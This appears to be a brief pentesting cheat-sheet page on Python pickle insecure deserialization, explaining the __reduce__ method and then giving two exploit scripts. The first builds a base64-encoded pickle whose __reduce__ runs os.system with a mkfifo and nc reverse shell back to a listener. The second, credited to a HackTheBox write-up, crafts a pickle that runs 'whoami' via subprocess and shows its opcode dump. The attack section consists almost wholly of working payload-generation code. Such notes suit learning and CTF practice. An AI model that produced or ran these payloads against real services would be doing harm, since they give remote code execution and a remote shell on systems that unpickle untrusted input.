# more technologies will be added soon !

### python pickle

### `__reduce__`

- In Python, `__reduce__` is a special method that allows you to customize the process of object serialization and deserialization using the `pickle` module. 
- When an object is pickled, the `__reduce__` method is called to provide a custom way to represent the object's state as a tuple.
- The `__reduce__` method should return a tuple that contains:

1. A callable (usually a class or a function) that will be used to reconstruct the object during unpickling.
2. A tuple of arguments to be passed to the callable when reconstructing the object.


### Exploit example [source](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

```

## another Example

- exploit for this object 
```
(dp0
S'serum'
p1
ccopy_reg
_reconstructor
p2
(c__main__
anti_pickle_serum
p3
c__builtin__
object
p4
Ntp5
Rp6
s.
```

- this exploit [source](https://0x00sec.org/t/pickle-insecure-deserialization-hackthebox-baby-website-rick/27130)
```python
#!/usr/bin/env python
import pickle
import pickletools
from base64 import b64encode
import subprocess


class anti_pickle_serum(object):
    def __reduce__(self):
        cmd=['whoami']
        return subprocess.check_output , (cmd,)


exploit_obj = anti_pickle_serum()

exploit_obj_data = pickle.dumps({"serum":exploit_obj} , protocol=0)

optmized_obj=pickletools.optimize(exploit_obj_data)
pickletools.dis(optmized_obj)

payload = b64encode(exploit_obj_data)

print(payload)


```

